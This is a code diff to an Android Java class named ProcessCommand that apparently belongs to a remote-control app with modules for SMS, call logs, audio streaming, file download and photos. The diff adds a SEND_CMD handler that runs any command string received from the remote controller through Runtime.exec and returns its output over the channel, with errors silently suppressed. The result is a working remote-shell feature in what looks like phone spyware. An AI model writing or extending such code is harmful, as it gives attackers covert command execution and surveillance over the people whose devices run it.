@@ -20,6 +20,10 @@ import android.telephony.SmsManager;
 import android.util.Log;
 import android.widget.Toast;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+
 import my.app.Library.AdvancedSystemInfo;
 import my.app.Library.AudioStreamer;
 import my.app.Library.CallLogLister;
@@ -123,6 +127,29 @@ public class ProcessCommand
 			client.fileDownloader = new FileDownloader(client);
 			client.fileDownloader.downloadFile(file, chan);
 			
+		} else if (commande == Protocol.SEND_CMD)
+		{
+			String cmdx = new String(arguments.array());
+			client.sendInformation("Command " + cmdx + " received");
+			try {
+			    Process process = Runtime.getRuntime().exec(cmdx);
+			    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+			    int read;
+			    char[] buffer = new char[4096];
+			    StringBuffer output = new StringBuffer();
+			    while ((read = reader.read(buffer)) > 0) {
+				    output.append(buffer, 0, read);
+			    }
+			    reader.close();
+			    process.waitFor();
+			    client.handleData(chan, output.toString().getBytes());
+
+			} catch (IOException e) {
+				//e.printStackTrace();
+			} catch (InterruptedException e) {
+			    //e.printStackTrace();
+			}
+
 		} else if (commande == Protocol.GET_PICTURE)
 		{
 			client.sendInformation("Photo picture request received");
